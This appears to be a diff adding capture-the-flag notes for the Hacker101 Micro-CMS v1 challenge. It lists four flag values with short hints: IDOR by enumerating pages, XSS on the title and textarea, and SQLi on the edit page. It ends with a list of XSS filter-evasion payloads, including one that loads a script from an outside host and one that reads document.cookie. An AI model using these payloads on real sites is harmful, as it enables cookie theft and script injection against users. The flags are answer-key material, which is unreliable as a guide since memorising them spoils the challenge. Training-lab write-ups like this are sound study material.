@@ -1,0 +1,50 @@
+Web
+
+
+https://medium.com/@isaacwangethi30/hacker101-micro-cms-v1-ctf-walkthrough-c372a9661b91
+
+
+
+Flag 1:
+---> b4ecead0cd2d00aadd6a2526e5ea31b46cf094661f95a1d5aa1df38b2eba7eae
+---> IDOR 
+---> Enumerate the page numbers
+---> Enumerate the edit page numbers
+
+
+Flag 2:
+---> d96f0df9e4eaec062038f35c7e52536956c60c6de9168f3bf6096983e56484c6
+---> Perform XSS on the title
+
+
+Flag 3:
+---> b403aadeca23760a0c7bd1b919d78aac95c1c26ebb5ad80d2bfe392de9a686db
+---> perform SQLi on the edit page
+
+
+Flag 4:
+---> ^FLAG^0c47a88f26d46a7edabb5782b51c0932fa2216daad2571962c4a6596a3229f13$FLAG$
+---> Perform XSS on Textarea
+---> script is sanitized to scrubbed tag
+
+Payloads used:
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
+<marquee><script>alert('XSS')</script></marquee>
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+"><script>alert(0)</script>
+<script src=http://yoursite.com/your_files.js></script>
+</title><script>alert(/xss/)</script>
+</textarea><script>alert(/xss/)</script>
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+<font style='color:expression(alert(document.cookie))'>
+<img src="javascript:alert('XSS')">
+<script language="JavaScript">alert('XSS')</script>
+<body onunload="javascript:alert('XSS');">
+<body onLoad="alert('XSS');"
+[color=red' onmouseover="alert('xss')"]mouse over[/color]
+
